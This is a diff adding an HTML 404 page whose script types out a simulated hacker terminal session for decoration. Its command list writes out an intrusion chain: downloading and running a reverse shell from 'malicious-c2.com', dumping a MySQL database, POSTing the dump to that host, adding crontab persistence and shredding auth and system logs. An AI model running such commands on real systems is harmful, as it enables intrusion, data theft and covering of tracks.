@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>404 - Terminal Exploit Simulation</title>
+<style>
+    body {
+        background: #000;
+        color: #0f0;
+        font-family: "Courier New", Courier, monospace;
+        font-size: 14px;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+    }
+
+    .terminal-container {
+        display: flex;
+        flex-direction: column;
+        height: 100vh;
+    }
+
+    .terminal-topbar {
+        display: flex;
+        align-items: center;
+        background: #333;
+        padding: 5px 10px;
+    }
+
+    /* Fake 'traffic lights' for the top bar */
+    .traffic-lights {
+        display: flex;
+        gap: 7px;
+        margin-right: 10px;
+    }
+
+    .light {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+    }
+
+    .red {
+        background: #ff5f56;
+    }
+
+    .yellow {
+        background: #ffbd2e;
+    }
+
+    .green {
+        background: #27c93f;
+    }
+
+    .window-title {
+        color: #ccc;
+        font-size: 12px;
+        user-select: none;
+    }
+
+    .terminal-window {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        padding: 10px;
+    }
+
+    #history {
+        flex: 1;
+        overflow-y: auto;
+        white-space: pre-wrap;
+        line-height: 1.4;
+    }
+
+    #current-line {
+        white-space: pre;
+    }
+
+    .prompt {
+        color: #0f0;
+    }
+
+    /* Blinking cursor */
+    @keyframes blink {
+        0% { opacity: 1; }
+        50% { opacity: 0; }
+        100% { opacity: 1; }
+    }
+
+    .cursor {
+        display: inline-block;
+        width: 8px;
+        background: #0f0;
+        margin-left: 2px;
+        animation: blink 1s infinite step-start;
+        vertical-align: bottom;
+    }
+</style>
+</head>
+<body>
+<div class="terminal-container">
+    <div class="terminal-topbar">
+        <div class="traffic-lights">
+            <div class="light red"></div>
+            <div class="light yellow"></div>
+            <div class="light green"></div>
+        </div>
+        <div class="window-title">root@exploit-box: ~</div>
+    </div>
+    <div class="terminal-window">
+        <div id="history"></div>
+        <div id="current-line">
+            <span class="prompt">[root@exploit-box ~]# </span><span id="command"></span><span class="cursor"></span>
+        </div>
+    </div>
+</div>
+<script>
+    const historyEl = document.getElementById('history');
+    const commandEl = document.getElementById('command');
+
+    // More realistic infiltration scenario:
+    // 1. Basic recon: whoami, uname, pwd
+    // 2. Listing directories, checking for interesting files
+    // 3. Checking system info, passwords, network connections
+    // 4. Downloading a payload (reverse shell)
+    // 5. Executing payload
+    // 6. Exfiltrating data
+    // 7. Cleaning logs
+    // 8. Leaving a 404 banner at the end.
+
+    const commands = [
+        { cmd: "whoami", output: "root", delay:500 },
+        { cmd: "uname -a", output: "Linux exploit-box 5.15.0-56-generic #62~20.04.1-Ubuntu SMP x86_64 GNU/Linux", delay:500 },
+        { cmd: "pwd", output: "/var/www/html", delay:500 },
+        { cmd: "ls -la", output: "drwxr-xr-x  5 root root 4096 .\ndrwxr-xr-x 14 root root 4096 ..\n-rw-r--r--  1 root root  512 index.html\n-rw-r--r--  1 root root 1024 creds.txt", delay:500 },
+        { cmd: "cat creds.txt", output: "admin: SuperSecretPassword123!\napi_key: 9f8a23f08f2f98af9f", delay:800 },
+        { cmd: "cat /etc/shadow", output: "cat: /etc/shadow: Permission denied", delay:500 },
+        { cmd: "netstat -tulpn | grep LISTEN", output: "tcp   0   0 0.0.0.0:80    0.0.0.0:*     LISTEN    1234/nginx\n" +
+                                                        "tcp   0   0 127.0.0.1:3306 0.0.0.0:*    LISTEN    5678/mysqld", delay:1000 },
+        { cmd: "sleep 1 && curl -O http://malicious-c2.com/payloads/revshell.bin", output: "", delay:1500 },
+        { cmd: "chmod +x revshell.bin && ./revshell.bin &", output: "[*] Connecting to remote host...\n[+] Reverse shell established!", delay:2000 },
+        { cmd: "sleep 2 && echo '[*] Pivoting to internal network...'", output: "[*] Pivoting to internal network...", delay:3000 },
+        { cmd: "sleep 1 && echo '[*] Scanning for hosts...'", output: "[*] Scanning for hosts...", delay:2000 },
+        { cmd: "nmap -sV 10.0.0.0/24", output: 
+          "Starting Nmap scan...\nHost: 10.0.0.10 (Linux server)\nOpen ports: 22/SSH 80/HTTP 443/HTTPS\n" +
+          "Host: 10.0.0.15 (Windows server)\nOpen ports: 445/SMB 3389/RDP\nNmap done.", delay:3000 },
+        { cmd: "sleep 2 && echo '[*] Dumping database credentials...'", output: "[*] Dumping database credentials...", delay:3000 },
+        { cmd: "cat /var/www/html/db_config.php", output: "<?php\n$db_user = 'root';\n$db_pass = 'P@ssw0rd!';\n$db_host='localhost';\n?>", delay:1500 },
+        { cmd: "sleep 1 && echo '[+] Dumping MySQL data...'", output: "[+] Dumping MySQL data...", delay:2000 },
+        { cmd: "mysqldump -u root -pP@ssw0rd! secret_db > dump.sql", output: "", delay:2000 },
+        { cmd: "sleep 1 && echo '[*] Exfiltrating dump.sql...'", output: "[*] Exfiltrating dump.sql...", delay:1500 },
+        { cmd: "curl -X POST -F file=@dump.sql http://malicious-c2.com/upload", output: "[+] Data exfiltrated successfully!", delay:3000 },
+        { cmd: "sleep 2 && echo '[*] Installing persistence...'", output: "[*] Installing persistence...", delay:3000 },
+        { cmd: "echo '@reboot root /var/www/html/revshell.bin &' >> /etc/crontab", output: "", delay:1500 },
+        { cmd: "sleep 1 && echo '[*] Cleaning logs...'", output: "[*] Cleaning logs...", delay:1500 },
+        { cmd: "shred -u /var/log/auth.log && shred -u /var/log/syslog", output: "", delay:2000 },
+        { cmd: "sleep 1 && echo '[+] Operation complete!'", output: "[+] Operation complete!", delay:1500 }
+    ];
+
+    const bannerText = `
+        ____  _  _   ___   ___ 
+       (  _ \\( \\/ ) / __) / __)
+        ) _ < )  ( ( (__ ( (_ \\
+       (____/(_/\\_) \\___) \\___/
+       
+    404 PAGE NOT FOUND N00B
+    `;
+
+    function wait(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function typeText(element, text, speed=50) {
+        for (let i = 0; i < text.length; i++) {
+            element.appendChild(document.createTextNode(text[i]));
+            await wait(speed);
+        }
+    }
+
+    async function simulateCommand(commandObj) {
+        // Clear any existing command text
+        commandEl.textContent = '';
+
+        // Type the command
+        await typeText(commandEl, commandObj.cmd, 50);
+
+        // Move the completed command line to the history
+        addToHistory(`[root@exploit-box ~]# ${commandObj.cmd}`);
+        commandEl.textContent = '';
+
+        // If there's a delay (like 'sleep'), wait that much
+        if (commandObj.delay) {
+            await wait(commandObj.delay);
+        }
+
+        // Print output if any
+        if (commandObj.output) {
+            const lines = commandObj.output.split('\n');
+            for (let line of lines) {
+                addToHistory(line);
+            }
+        }
+    }
+
+    function addToHistory(line) {
+        const lineEl = document.createElement('div');
+        lineEl.textContent = line;
+        historyEl.appendChild(lineEl);
+        historyEl.scrollTop = historyEl.scrollHeight;
+    }
+
+    async function showBanner() {
+        const lines = bannerText.split('\n');
+        for (let line of lines) {
+            addToHistory(line);
+            await wait(10);
+        }
+    }
+
+    async function runAllCommands() {
+        for (let cmdObj of commands) {
+            await simulateCommand(cmdObj);
+            await wait(500);
+        }
+        await showBanner();
+    }
+
+    (async () => {
+        await runAllCommands();
+    })();
+</script>
+</body>
+</html>
